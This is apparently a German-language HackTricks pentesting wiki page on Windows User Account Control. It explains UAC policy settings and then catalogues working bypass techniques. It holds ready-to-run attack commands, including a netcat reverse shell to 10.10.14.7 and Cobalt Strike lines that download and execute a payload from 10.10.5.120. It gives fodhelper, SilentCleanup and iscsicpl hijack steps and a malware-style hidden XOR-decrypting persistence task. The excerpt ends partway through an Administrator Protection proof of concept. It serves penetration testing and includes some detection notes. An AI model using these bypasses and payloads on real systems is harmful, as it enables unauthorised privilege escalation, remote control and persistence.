# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für Aktivitäten mit erhöhten Rechten** ermöglicht. Anwendungen verfügen über unterschiedliche `integrity`-Stufen, und ein Programm mit einer **hohen Stufe** kann Aufgaben ausführen, die das **System potenziell gefährden könnten**. Wenn UAC aktiviert ist, **werden Anwendungen und Aufgaben immer im Sicherheitskontext eines Nicht-Administratorkontos ausgeführt**, es sei denn, ein Administrator autorisiert diese Anwendungen oder Aufgaben ausdrücklich, mit Zugriff auf Administratorebene auf dem System ausgeführt zu werden. Es handelt sich um eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, aber nicht als Sicherheitsgrenze angesehen wird.<sup>[[2]](#references)</sup>

Weitere Informationen zu integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiviert ist, erhält ein Administratorkonto 2 Tokens: ein Standardbenutzer-Token für reguläre Aktionen mit mittlerer Integrität und eines mit den Administratorrechten.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) erläutert ausführlich, wie UAC funktioniert, und umfasst den Anmeldevorgang, die Benutzererfahrung und die UAC-Architektur.<sup>[[2]](#references)</sup> Administratoren können Sicherheitsrichtlinien verwenden, um die Funktionsweise von UAC auf lokaler Ebene an ihre Organisation anzupassen (mit secpol.msc), oder sie können die Konfiguration über Group Policy Objects (GPO) in einer Active-Directory-Domänenumgebung vornehmen und verteilen. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich erläutert. Für UAC können 10 Group-Policy-Einstellungen festgelegt werden. Die folgende Tabelle enthält weitere Informationen:

| Group-Policy-Einstellung                                                                                                                                                                                                                                                                                                                                                           | Registrierungsschlüssel                | Standardeinstellung                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Deaktiviert)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zustimmungsaufforderung für Nicht-Windows-Binärdateien auf dem sicheren Desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Aufforderung zur Eingabe von Anmeldeinformationen auf dem sicheren Desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Aktiviert; standardmäßig in Enterprise deaktiviert)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Deaktiviert)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Aktiviert)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Aktiviert)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Deaktiviert)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Aktiviert)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Aktiviert)                                              |

### Richtlinien für die Installation von Software unter Windows

Die **lokalen Sicherheitsrichtlinien** ("secpol.msc" auf den meisten Systemen) sind standardmäßig so konfiguriert, dass **Nicht-Administratoren keine Softwareinstallationen durchführen können**. Das bedeutet, dass ein Nicht-Administratorkonto selbst dann, wenn es das Installationsprogramm für deine Software herunterladen kann, dieses nicht ohne ein Administratorkonto ausführen kann.

### Registrierungsschlüssel, um UAC zur Anforderung einer Erhöhung zu zwingen

Als Standardbenutzer ohne Administratorrechte kannst du sicherstellen, dass das **Standardkonto von UAC zur Eingabe von Anmeldeinformationen aufgefordert wird**, wenn es versucht, bestimmte Aktionen auszuführen. Dazu müssen bestimmte **Registrierungsschlüssel** geändert werden, wofür du Administratorrechte benötigst, sofern kein **UAC bypass** vorliegt oder der Angreifer bereits als Administrator angemeldet ist.

Selbst wenn sich der Benutzer in der Gruppe **Administrators** befindet, zwingen diese Änderungen den Benutzer dazu, seine **Kontodaten erneut einzugeben**, um administrative Aktionen auszuführen.

**In der Praxis ist dies nur nützlich, wenn du bereits über ein Token mit erhöhten Rechten, einen UAC bypass oder eine Fehlkonfiguration verfügst, durch die du diese Schlüssel ändern kannst; andernfalls wird das Schreiben in die Registrierung selbst blockiert.**

Die Registrierungsschlüssel und Einträge, die du ändern musst, sind folgende (mit ihren Standardwerten in Klammern):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dies kann auch manuell über das Tool für lokale Sicherheitsrichtlinien durchgeführt werden. Nach der Änderung wird der Benutzer bei administrativen Vorgängen aufgefordert, seine Anmeldeinformationen erneut einzugeben.

### Hinweis

**User Account Control ist keine Sicherheitsgrenze.** Daher können Standardbenutzer ohne einen local privilege escalation exploit nicht aus ihren Konten ausbrechen und Administratorrechte erlangen.

### Einen Benutzer um „vollen Computerzugriff“ bitten
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Der geschützte Modus von Internet Explorer verwendet Integritätsprüfungen, um zu verhindern, dass Prozesse mit hoher Integritätsstufe (wie Webbrowser) auf Daten mit niedriger Integritätsstufe (wie den Ordner für temporäre Internetdateien) zugreifen. Dies wird erreicht, indem der Browser mit einem Token mit niedriger Integritätsstufe ausgeführt wird. Wenn der Browser versucht, auf Daten zuzugreifen, die in der Zone mit niedriger Integritätsstufe gespeichert sind, überprüft das Betriebssystem die Integritätsstufe des Prozesses und gewährt den Zugriff entsprechend. Diese Funktion hilft dabei, Remote-Code-Execution-Angriffe daran zu hindern, auf sensible Daten im System zuzugreifen.
- Wenn sich ein Benutzer bei Windows anmeldet, erstellt das System ein Zugriffstoken, das eine Liste der Berechtigungen des Benutzers enthält. Berechtigungen werden als Kombination aus den Rechten und Fähigkeiten eines Benutzers definiert. Das Token enthält außerdem eine Liste der Anmeldeinformationen des Benutzers. Dabei handelt es sich um Anmeldeinformationen, die zur Authentifizierung des Benutzers am Computer und bei Ressourcen im Netzwerk verwendet werden.

### Autoadminlogon

Um Windows so zu konfigurieren, dass beim Start automatisch ein bestimmter Benutzer angemeldet wird, muss der **Registrierungsschlüssel `AutoAdminLogon`** gesetzt werden. Dies ist für Kiosk-Umgebungen oder zu Testzwecken nützlich. Verwende dies nur auf sicheren Systemen, da das Passwort in der Registrierung offengelegt wird.

Setze die folgenden Schlüssel mit dem Registrierungs-Editor oder `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Um zum normalen Anmeldeverhalten zurückzukehren, setze `AutoAdminLogon` auf 0.

## UAC bypass

> [!TIP]
> Beachte, dass UAC bypass bei grafischem Zugriff auf das Opfer unkompliziert ist, da du einfach auf „Yes“ klicken kannst, wenn die UAC-Eingabeaufforderung erscheint.

UAC bypass wird in der folgenden Situation benötigt: **UAC ist aktiviert, dein Prozess läuft in einem Kontext mit mittlerer Integritätsstufe und dein Benutzer gehört zur Administratorengruppe**.

Es ist wichtig zu erwähnen, dass es **wesentlich schwieriger ist, UAC zu umgehen, wenn die höchste Sicherheitsstufe (Always) aktiviert ist, als bei einer der anderen Stufen (Default).**

### Fast triage from a medium-integrity shell

Bevor du einen Bypass ausprobierst, bestätige, dass du dich im richtigen Szenario befindest, und ordne den Host-Build bekannten funktionierenden Methoden zu:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktische Hinweise:
- Wenn `EnableLUA=0` ist, benötigst du keinen Bypass: Jeder Admin-Token kann direkt hohe Integrität anfordern.
- `ConsentPromptBehaviorAdmin=2` oder `5` ist das übliche Szenario für auto-elevate- / COM-basierte Bypasses.
- `Always Notify` erhöht die Hürde, aber du solltest trotzdem den exakten Build testen, anstatt von einem Fehlschlag auszugehen: UACME führt auch auf modernen Windows-Builds weiterhin einige mit `AlwaysNotify compatible` gekennzeichnete Methoden.<sup>[[3]](#references)</sup>

### UAC deaktiviert

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**), kannst du beispielsweise eine **reverse shell mit Administratorberechtigungen** (hohe Integritätsstufe) ausführen:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** grundlegender UAC-"bypass" (vollständiger Dateisystemzugriff)

Wenn du eine shell mit einem Benutzer hast, der Mitglied der Gruppe Administrators ist, kannst du die über SMB (Dateisystem) freigegebene **C$**-Freigabe lokal als neuen Datenträger einbinden und erhältst **Zugriff auf alles innerhalb des Dateisystems** (einschließlich des Administrator-Home-Ordners).

> [!WARNING]
> **Es sieht so aus, als würde dieser Trick nicht mehr funktionieren**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass mit Cobalt Strike

Die Cobalt-Strike-Techniken funktionieren nur, wenn UAC nicht auf die höchste Sicherheitsstufe eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** verfügen ebenfalls über mehrere Module zum **bypass** der **UAC**.

### Erhöhte COM-Schnittstellen (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM-Objekte bleiben auch in aktuellen Builds eine praktische UAC-Angriffsfläche. `ICMLuaUtil` wird von UACME weiterhin als auf aktuellen Windows-Branches funktionierend geführt, und offensive Tools passen `CMSTPLUA` fortlaufend an, indem sie einen interaktiven Desktop-Prozess, eine 64-Bit-Ausführung und manchmal PEB-/Prozess-Masquerading kombinieren, bevor sie den COM Elevation Moniker aufrufen.<sup>[[3]](#references)</sup>

Praktische Tipps:
- Bevorzugt einen **64-Bit**-Prozess in der **interaktiven Sitzung** des Benutzers (üblicherweise `explorer.exe` oder einen untergeordneten Prozess davon).
- Wenn eine rohe Shell fehlschlägt, versucht es erneut aus einer BOF- / UACME-Implementierung heraus statt mit einem naiven `CreateProcess`-Wrapper.
- Erwartet, dass die Ausführung des untergeordneten Prozesses in einem **separaten erhöhten Prozess** erfolgt; viele BOFs erhöhen nicht den aktuellen Beacon-Prozess direkt.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC-bypass-Exploits

[**UACME**](https://github.com/hfiref0x/UACME) ist eine Sammlung von UAC-bypass-Techniken. Kompiliert es mit Visual Studio oder MSBuild; der Build erstellt mehrere ausführbare Dateien (zum Beispiel `Source\Akagi\output\x64\Debug\Akagi.exe`), wählt daher die für den Ziel-Build geeignete Methode aus.<sup>[[3]](#references)</sup>\
Seid vorsichtig: Einige bypass-Techniken starten sichtbare Programme oder Eingabeaufforderungen, die den Benutzer alarmieren können.<sup>[[3]](#references)</sup>

UACME enthält die **Build-Version, ab der jede Technik zu funktionieren begann**.<sup>[[3]](#references)</sup> Ihr könnt nach einer Technik suchen, die eure Versionen betrifft:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Außerdem erhältst du anhand [dieser](https://en.wikipedia.org/wiki/Windows_10_version_history) Seite das Windows-Release `1607` aus den Build-Versionen.

Ein praktischer Workflow besteht darin, zunächst den **Host-Build zu bewerten** und erst danach die passende Methode auszuführen:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` vergleicht den lokalen Build schnell mit seinen bekannten UAC-Methoden, was nützlich ist, um veraltete PoCs schnell auszusortieren.<sup>[[4]](#references)</sup>
- `UACME` bleibt der beste öffentliche Katalog, um einen Bypass einem bestimmten Build zuzuordnen. Neuere Releases haben neue Methoden hinzugefügt und bestehende Methoden erneut gegen **Windows 11 25H2** getestet. Daher sollte die README bzw. die Release Notes erneut geprüft werden, bevor davon ausgegangen wird, dass ein älterer Blogpost weiterhin unverändert gilt.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertrauenswürdige Binary `fodhelper.exe` wird unter modernen Windows-Versionen automatisch mit erhöhten Rechten ausgeführt. Beim Start fragt sie den folgenden Registry-Pfad pro Benutzer ab, ohne das Verb `DelegateExecute` zu validieren. Wird dort ein Befehl platziert, kann ein Prozess mit Medium Integrity (der Benutzer ist Mitglied der Administrators-Gruppe) ohne UAC-Eingabeaufforderung einen Prozess mit High Integrity starten.

Vom fodhelper abgefragter Registry-Pfad:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-Schritte (Payload festlegen, dann auslösen)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Gruppe „Administrators“ ist und die UAC-Ebene auf standard/locker eingestellt ist (nicht auf „Always Notify“ mit zusätzlichen Einschränkungen).
- Verwende den Pfad `sysnative`, um eine 64-Bit-PowerShell aus einem 32-Bit-Prozess unter 64-Bit-Windows zu starten.
- Die Payload kann ein beliebiger Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide für mehr Stealth interaktive UIs.

#### CurVer/extension hijack-Variante (nur HKCU)

Aktuelle Samples, die `fodhelper.exe` missbrauchen, vermeiden `DelegateExecute` und leiten stattdessen die `ms-settings`-ProgID über den benutzerbezogenen `CurVer`-Wert um. Die automatisch erhöht gestartete Binärdatei löst den Handler weiterhin unter `HKCU` auf, sodass kein Admin-Token erforderlich ist, um die Schlüssel anzulegen:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Nach der Rechteausweitung **deaktiviert** Malware häufig **zukünftige Eingabeaufforderungen**, indem sie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` auf `0` setzt. Anschließend führt sie weitere Maßnahmen zur Umgehung von Schutzmechanismen durch (z. B. `Add-MpPreference -ExclusionPath C:\ProgramData`) und erstellt die Persistenz neu, um mit hoher Integrität ausgeführt zu werden. Eine typische Persistenzaufgabe speichert ein **XOR-verschlüsseltes PowerShell-Skript** auf der Festplatte und dekodiert bzw. führt es jede Stunde im Arbeitsspeicher aus:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Diese Variante bereinigt weiterhin den Dropper und lässt nur die gestagten Payloads zurück. Dadurch muss die Erkennung auf die Überwachung des **`CurVer`-Hijacks**, der Manipulation von `ConsentPromptBehaviorAdmin`, der Erstellung von Defender-Ausschlüssen oder von geplanten Tasks setzen, die PowerShell im Speicher entschlüsseln.<sup>[[5]](#references)</sup>

### UAC-Umgehung über den `SilentCleanup`-Task (`HKCU\Environment\windir`)

`SilentCleanup` startet `cleanmgr.exe` mit den höchsten Berechtigungen und erweitert `%windir%` aus der Benutzerumgebung. Wenn du `HKCU\Environment\windir` kontrollierst, kannst du diese Erweiterung auf einen beliebigen Befehl umleiten und ohne Zustimmungsdialog eine hohe Integrität erlangen.<sup>[[8]](#references)</sup> Diese Methode ist auf aktuellen Builds weiterhin einen Test wert, da UACME die Technik aktiv hält und das aktuelle Issue-Tracking zeigt, dass Windows 11 24H2 möglicherweise nur geringfügige Anpassungen der Anführungszeichen erfordert.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Wenn die Aufgabe den Pfad bei diesem Build in Anführungszeichen setzt, versuche es erneut mit einem Payload, der mit einem Anführungszeichen endet (zum Beispiel `cmd.exe"`). Bereinige `HKCU\Environment\windir` nach dem Test immer.

#### Weitere UAC bypass

Viele klassische UAC bypasses, die UI-Abläufe, COM-Objekte oder Desktop-Interaktion missbrauchen, erfordern eine **vollständige interaktive Sitzung** mit dem Opfer; eine gewöhnliche `nc.exe`-Shell oder ein in **Session 0** ausgeführter Dienst reicht oft nicht aus.

Das lässt sich häufig mit einer **meterpreter**-Sitzung lösen. Migriere zu einem **process**, dessen **Session**-Wert **1** entspricht:

![ms-settings auf eine benutzerdefinierte Erweiterung (.thm) verweisen und diese Erweiterung unserem Payload zuordnen - Weitere UAC bypass: Dies ist mit einer meterpreter-Sitzung möglich. Migriere zu einem Prozess mit dem Wert Session...](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC Bypass mit GUI

Wenn du Zugriff auf eine **GUI** hast, kannst du die UAC-Abfrage einfach **akzeptieren**, sobald sie erscheint; du benötigst eigentlich keinen technischen Bypass. Daher reicht eine GUI-Sitzung oft aus, um die praktischen Einschränkungen durch UAC zu umgehen.

Wenn du außerdem eine GUI-Sitzung erhältst, die jemand verwendet hat (möglicherweise über RDP), **laufen einige Tools als Administrator**. Von dort aus könntest du beispielsweise direkt eine **cmd** **als Administrator ausführen**, ohne dass UAC erneut nachfragt, etwa mit [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Das kann etwas **unauffälliger** sein.

### Lauter Brute-Force-UAC-bypass

Wenn Lärm akzeptabel ist, kann ein Tool wie [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) wiederholt eine Erhöhung der Berechtigungen anfordern, bis der Benutzer sie akzeptiert.

### Dein eigener Bypass – grundlegende UAC-bypass-Methodik

Wenn du dir **UACME** ansiehst, wirst du feststellen, dass **viele UAC bypasses DLL hijacking missbrauchen** (häufig, indem eine privilegierte Binärdatei dazu gebracht wird, eine vom Angreifer kontrollierte DLL aus einem beschreibbaren Pfad zu laden). [Lies dies, um zu erfahren, wie du eine DLL-hijacking-Schwachstelle findest](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde eine Binärdatei, die **autoelevate** ausführt (prüfe, ob sie beim Start mit einem hohen Integritätslevel ausgeführt wird).
2. Suche mit Procmon nach Ereignissen vom Typ "**NAME NOT FOUND**", die für **DLL Hijacking** anfällig sein können.
3. Wahrscheinlich musst du die DLL in einige **geschützte Pfade** schreiben (wie `C:\Windows\System32`), für die du keine Schreibberechtigungen hast. Dies kannst du umgehen mit:
1. **wusa.exe**: Windows 7, 8 und 8.1. Damit kann der Inhalt einer CAB-Datei in geschützte Pfade extrahiert werden (weil dieses Tool mit einem hohen Integritätslevel ausgeführt wird).
2. **IFileOperation**: Windows 10.
4. Erstelle ein **Skript**, das deine DLL in den geschützten Pfad kopiert und die anfällige, automatisch erhöhte Binärdatei ausführt.

### Eine weitere UAC-bypass-Technik

Dabei wird überwacht, ob eine **autoElevated binary** versucht, den **Namen/Pfad** einer **Binärdatei** oder eines **Befehls** aus der **Registry** zu **lesen**, der **ausgeführt** werden soll (dies ist besonders interessant, wenn die Binärdatei diese Informationen in **HKCU** sucht).

### UAC bypass über `SysWOW64\iscsicpl.exe` + DLL hijack über den benutzerspezifischen `PATH`

Die 32-Bit-Datei `C:\Windows\SysWOW64\iscsicpl.exe` ist eine **auto-elevated** Binärdatei, die über die Suchreihenfolge dazu gebracht werden kann, `iscsiexe.dll` zu laden. Wenn du eine schädliche `iscsiexe.dll` in einem **vom Benutzer beschreibbaren** Ordner platzieren und anschließend den `PATH` des aktuellen Benutzers ändern kannst (zum Beispiel über `HKCU\Environment\Path`), sodass dieser Ordner durchsucht wird, lädt Windows möglicherweise die Angreifer-DLL in den privilegierten `iscsicpl.exe`-Prozess, **ohne eine UAC-Abfrage anzuzeigen**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktische Hinweise:
- Dies ist nützlich, wenn der aktuelle Benutzer Mitglied der **Administrators** ist, aber aufgrund von UAC mit **Medium Integrity** ausgeführt wird.
- Die **SysWOW64**-Kopie ist für diesen Bypass relevant. Behandle die **System32**-Kopie als separate Binärdatei und überprüfe ihr Verhalten unabhängig.
- Das Primitive ist eine Kombination aus **auto-elevation** und **DLL search-order hijacking**. Daher ist derselbe ProcMon-Workflow wie bei anderen UAC bypasses nützlich, um das Laden der fehlenden DLL zu überprüfen.

Minimaler Ablauf:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Erkennungsideen:
- Auf `reg add` / Registry-Schreibvorgänge in `HKCU\Environment\Path` alerten, wenn unmittelbar danach `C:\Windows\SysWOW64\iscsicpl.exe` ausgeführt wird.
- Nach `iscsiexe.dll` in **benutzerkontrollierten** Speicherorten wie `%TEMP%` oder `%LOCALAPPDATA%\Microsoft\WindowsApps` suchen.
- Starts von `iscsicpl.exe` mit unerwarteten Kindprozessen oder DLL-Ladevorgängen außerhalb der normalen Windows-Verzeichnisse korrelieren.

### Neuere Forschung, die separat geprüft werden sollte

Einige Chains nach 2024 sehen nicht mehr wie die klassischen Registry-Hijacks unter `HKCU\Software\Classes` aus. Beispielsweise können Activation-Context-Cache-Poisoning-Angriffe ein **Drive-Remapping** und eine **DLL-Redirection** verketten, um über vertrauenswürdige UI- bzw. automatisch erhöhte Binaries wie `ctfmon.exe` und spätere Ziele wie `fodhelper.exe` von mittlerer zu hoher Integrity zu gelangen. Anstatt den umfangreichen PoC hier zu duplizieren, siehe die kompakten Payload-Beispiele unter:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) Drive-Letter-Hijack über die DOS-Device-Map pro Logon-Session

Die vollständige `RAiLaunchAdminProcess`- / UIAccess-Angriffsfläche unter Windows 11 25H2 ist auf der dedizierten Seite beschrieben:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ verwendet Shadow-Admin-Tokens mit sitzungsbezogenen `\Sessions\0\DosDevices/<LUID>`-Maps. Das Verzeichnis wird von `SeGetTokenDeviceMap` bei der ersten `\??`-Auflösung verzögert erstellt. Wenn der Angreifer das Shadow-Admin-Token nur auf **SecurityIdentification** impersoniert, wird das Verzeichnis mit dem Angreifer als **Owner** erstellt (es erbt `CREATOR OWNER`), wodurch Drive-Letter-Links Vorrang vor `\GLOBAL??` erhalten.<sup>[[7]](#references)</sup>

**Schritte:**

1. Aus einer Session mit niedrigen Privilegien `RAiProcessRunOnce` aufrufen, um ein promptloses Shadow-Admin-`runonce.exe` zu starten.
2. Sein primäres Token in ein **Identification**-Token duplizieren und es impersonieren, während `\??` geöffnet wird, um die Erstellung von `\Sessions\0\DosDevices/<LUID>` unter dem Besitz des Angreifers zu erzwingen.
3. Dort einen `C:`-Symlink erstellen, der auf vom Angreifer kontrollierten Speicher verweist; nachfolgende Dateisystemzugriffe in dieser Session lösen `C:` zum Angreifer-Pfad auf und ermöglichen so einen DLL-/Datei-Hijack ohne Prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
